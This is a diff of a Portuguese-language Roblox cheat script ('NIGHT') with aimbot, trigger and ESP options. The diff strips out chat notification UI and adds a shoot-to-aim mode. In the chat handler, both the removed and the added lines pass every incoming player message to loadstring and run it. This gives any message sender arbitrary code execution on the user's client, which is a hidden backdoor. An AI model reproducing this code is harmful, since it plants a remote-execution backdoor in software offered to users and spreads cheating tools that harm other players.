@@ -1,4 +1,4 @@
-Local HttpService = game:GetService("HttpService")
+local HttpService = game:GetService("HttpService")
 local log_folder = "NIGHT_DATA"
 local log_file = log_folder .. "/logs_privados.txt"
 
@@ -207,83 +207,6 @@ local ExecucaoSegura, ErroFatal = pcall(function()
         local OpenButton = Instance.new("ImageButton", ScreenGui) OpenButton.Size = UDim2.new(0, 70, 0, 70) OpenButton.Position = UDim2.new(0, 15, 0.5, -35) OpenButton.BackgroundTransparency = 1 OpenButton.Image = "rbxthumb://type=Asset&id=115034808007829&w=420&h=420" OpenButton.ScaleType = Enum.ScaleType.Crop OpenButton.Visible = true OpenButton.Active = true Instance.new("UICorner", OpenButton).CornerRadius = UDim.new(1, 0)
         local OpenScale = Instance.new("UIScale", OpenButton) OpenScale.Scale = 1
 
-        local UnreadCount = 0
-        local BadgeFrame = Instance.new("Frame", OpenButton)
-        BadgeFrame.Size = UDim2.new(0, 22, 0, 22)
-        BadgeFrame.Position = UDim2.new(1, -15, 0, -5)
-        BadgeFrame.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-        BadgeFrame.Visible = false
-        Instance.new("UICorner", BadgeFrame).CornerRadius = UDim.new(1, 0)
-        
-        local BadgeText = Instance.new("TextLabel", BadgeFrame)
-        BadgeText.Size = UDim2.new(1, 0, 1, 0)
-        BadgeText.BackgroundTransparency = 1
-        BadgeText.Text = "0"
-        BadgeText.TextColor3 = C_WHITE
-        BadgeText.Font = Enum.Font.GothamBold
-        BadgeText.TextSize = 11
-
-        local IgnoreNotifs = false
-        local NotifFrame = Instance.new("Frame", ScreenGui)
-        NotifFrame.Size = UDim2.new(0, 240, 0, 70)
-        NotifFrame.Position = UDim2.new(1, 10, 1, -20)
-        NotifFrame.AnchorPoint = Vector2.new(0, 1)
-        NotifFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-        NotifFrame.BorderSizePixel = 0
-        Instance.new("UICorner", NotifFrame).CornerRadius = UDim.new(0, 8)
-        
-        local NotifStroke = Instance.new("UIStroke", NotifFrame)
-        NotifStroke.Color = CurrentTheme
-        NotifStroke.Thickness = 1.5
-        table.insert(ThemeElements.Strokes, NotifStroke)
-
-        local NotifTitle = Instance.new("TextLabel", NotifFrame)
-        NotifTitle.Size = UDim2.new(1, -10, 0, 20)
-        NotifTitle.Position = UDim2.new(0, 10, 0, 5)
-        NotifTitle.BackgroundTransparency = 1
-        NotifTitle.Text = "🔔 Nova Mensagem"
-        NotifTitle.TextColor3 = CurrentTheme
-        NotifTitle.Font = Enum.Font.GothamBold
-        NotifTitle.TextSize = 13
-        NotifTitle.TextXAlignment = Enum.TextXAlignment.Left
-        table.insert(ThemeElements.Texts, NotifTitle)
-
-        local NotifDesc = Instance.new("TextLabel", NotifFrame)
-        NotifDesc.Size = UDim2.new(1, -20, 0, 20)
-        NotifDesc.Position = UDim2.new(0, 10, 0, 25)
-        NotifDesc.BackgroundTransparency = 1
-        NotifDesc.Text = "Alguém enviou mensagem..."
-        NotifDesc.TextColor3 = C_WHITE
-        NotifDesc.Font = Enum.Font.Gotham
-        NotifDesc.TextSize = 12
-        NotifDesc.TextXAlignment = Enum.TextXAlignment.Left
-
-        local NotifIgnoreBtn = Instance.new("TextButton", NotifFrame)
-        NotifIgnoreBtn.Size = UDim2.new(0, 130, 0, 16)
-        NotifIgnoreBtn.Position = UDim2.new(0, 10, 0, 48)
-        NotifIgnoreBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        NotifIgnoreBtn.Text = "Não mostrar novamente"
-        NotifIgnoreBtn.TextColor3 = C_WHITE
-        NotifIgnoreBtn.Font = Enum.Font.Gotham
-        NotifIgnoreBtn.TextSize = 10
-        Instance.new("UICorner", NotifIgnoreBtn).CornerRadius = UDim.new(0, 4)
-
-        NotifIgnoreBtn.MouseButton1Click:Connect(function()
-            IgnoreNotifs = true
-            TweenService:Create(NotifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(1, 10, 1, -20)}):Play()
-        end)
-
-        local NotifTimer = nil
-        local function ShowNotification(autor)
-            if IgnoreNotifs or CurrentUIState ~= "Hidden" then return end
-            NotifDesc.Text = autor .. " mandou mensagem"
-            TweenService:Create(NotifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(1, -250, 1, -20)}):Play()
-            if NotifTimer then task.cancel(NotifTimer) end
-            NotifTimer = task.delay(4, function()
-                TweenService:Create(NotifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, 10, 1, -20)}):Play()
-            end)
-        end
-
         local CurrentUIState = "Minimized" 
         
         local function PlayMinimizeAnimation() 
@@ -302,8 +225,6 @@ local ExecucaoSegura, ErroFatal = pcall(function()
             if CurrentUIState == "Open" then return end
             CurrentUIState = "Open" 
             MainFrame.Visible = true 
-            UnreadCount = 0
-            BadgeFrame.Visible = false
             local t1 = TweenService:Create(OpenScale, TweenInfo.new(0.2, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {Scale = 0})
             local t2 = TweenService:Create(MainScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
             t1:Play() 
@@ -355,8 +276,6 @@ local ExecucaoSegura, ErroFatal = pcall(function()
             CurrentUIState = "Open" 
             MainFrame.Visible = true 
             OpenButton.Visible = false 
-            UnreadCount = 0
-            BadgeFrame.Visible = false
             MainScale.Scale = 0
             TweenService:Create(MainScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
         end
@@ -566,7 +485,7 @@ local ExecucaoSegura, ErroFatal = pcall(function()
         PlusBtn.MouseButton1Click:Connect(function() Trigger_Settings.Radius = math.clamp(Trigger_Settings.Radius + 5, 20, 150) TriggerCircle.Size = UDim2.new(0, Trigger_Settings.Radius * 2, 0, Trigger_Settings.Radius * 2) end)
 
         local VisibleCheckBtn = CreateCheckbox(TabAimbot, "Visível (Wall Check)", 0, 215, false, function(s) Aimbot_Settings.VisibleCheck = s end)
-        CreateSimpleRadioGroup(TabAimbot, "Tipo de Aimbot:", 0, 155, {"Ao Olhar", "Ao Atirar"}, "Ao Olhar", function(v) Aimbot_Settings.Type = v if v == "Ao Atirar" then TriggerUIFrame.Visible = true TriggerCircle.Visible = false VisibleCheckBtn:TweenPosition(UDim2.new(0, 0, 0, 255), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true) else TriggerCircle.Visible = false IsTouchingScreen = false VisibleCheckBtn:TweenPosition(UDim2.new(0, 0, 0, 215), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true) task.delay(0.15, function() if Aimbot_Settings.Type == "Ao Olhar" then TriggerUIFrame.Visible = false end end) end end)
+        CreateSimpleRadioGroup(TabAimbot, "Tipo de Aimbot:", 0, 155, {"Ao Olhar", "Ao Atirar"}, "Ao Olhar", function(v) Aimbot_Settings.Type = v if v == "Ao Atirar" then TriggerUIFrame.Visible = true TriggerCircle.Visible = true VisibleCheckBtn:TweenPosition(UDim2.new(0, 0, 0, 255), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true) else TriggerCircle.Visible = false IsTouchingScreen = false VisibleCheckBtn:TweenPosition(UDim2.new(0, 0, 0, 215), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true) task.delay(0.15, function() if Aimbot_Settings.Type == "Ao Olhar" then TriggerUIFrame.Visible = false end end) end end)
 
         local ESP_X = 15 local DROPDOWN_X = 160 
         local function CreateComboDropdownParent(parent, text, options, defaultOption, x, y, cbAction, dropAction) local container = Instance.new("Frame", parent) container.Size = UDim2.new(0, 320, 0, 25) container.Position = UDim2.new(0, x, 0, y) container.BackgroundTransparency = 1 CreateCheckbox(container, text, 0, 0, false, cbAction) CreateDropdown(container, text.."_Opt", options, DROPDOWN_X, 0, defaultOption, dropAction, false) return container end
@@ -844,27 +763,8 @@ local ExecucaoSegura, ErroFatal = pcall(function()
                         if ultimoDado and ultimaChave ~= ultimaMensagemProcessada then
                             local idAntigo = ultimaMensagemProcessada ultimaMensagemProcessada = ultimaChave
                             if idAntigo ~= nil and ultimoDado.Autor ~= LocalPlayer.Name then
-                                if ultimoDado.Destinatario then 
-                                    if ultimoDado.Destinatario == LocalPlayer.Name then 
-                                        AdicionarMensagemNaUI(ultimoDado.Autor .. " [Sussurro]", ultimoDado.Conteudo, ultimoDado.JobId) 
-                                        task.spawn(function() pcall(function() local c = loadstring(ultimoDado.Conteudo) if c then c() end end) end) 
-                                        if CurrentUIState ~= "Open" then
-                                            UnreadCount = UnreadCount + 1
-                                            BadgeText.Text = (UnreadCount > 99) and "99+" or tostring(UnreadCount)
-                                            BadgeFrame.Visible = true
-                                            ShowNotification(ultimoDado.Autor .. " (Sussurro)")
-                                        end
-                                    end
-                                else 
-                                    AdicionarMensagemNaUI(ultimoDado.Autor, ultimoDado.Conteudo, ultimoDado.JobId) 
-                                    task.spawn(function() pcall(function() local c = loadstring(ultimoDado.Conteudo) if c then c() end end) end) 
-                                    if CurrentUIState ~= "Open" then
-                                        UnreadCount = UnreadCount + 1
-                                        BadgeText.Text = (UnreadCount > 99) and "99+" or tostring(UnreadCount)
-                                        BadgeFrame.Visible = true
-                                        ShowNotification(ultimoDado.Autor)
-                                    end
-                                end
+                                if ultimoDado.Destinatario then if ultimoDado.Destinatario == LocalPlayer.Name then AdicionarMensagemNaUI(ultimoDado.Autor .. " [Sussurro]", ultimoDado.Conteudo, ultimoDado.JobId) task.spawn(function() pcall(function() local c = loadstring(ultimoDado.Conteudo) if c then c() end end) end) end
+                                else AdicionarMensagemNaUI(ultimoDado.Autor, ultimoDado.Conteudo, ultimoDado.JobId) task.spawn(function() pcall(function() local c = loadstring(ultimoDado.Conteudo) if c then c() end end) end) end
                             end
                         end
                     end
@@ -1049,7 +949,7 @@ local ExecucaoSegura, ErroFatal = pcall(function()
             RunService:BindToRenderStep("NIGHT_Aimbot_Priority", Enum.RenderPriority.Camera.Value - 1, function()
                 local ok, err = pcall(function() 
                     if FunctionsEnabled and Aimbot_Settings.Mode ~= "Nenhum" and IsAlive(LocalPlayer) then
-                        local canAim = (Aimbot_Settings.Type == "Ao Olhar")
+                        local canAim = (Aimbot_Settings.Type == "Ao Olhar") or (Aimbot_Settings.Type == "Ao Atirar" and IsTouchingScreen)
                         if canAim then
                             if LockedTarget and (not LockedTarget.Parent or not IsAlive(Players:GetPlayerFromCharacter(LockedTarget.Parent.Parent or LockedTarget.Parent))) then LockedTarget = nil end
                             if not LockedTarget then LockedTarget = GetClosestEnemyTarget() end
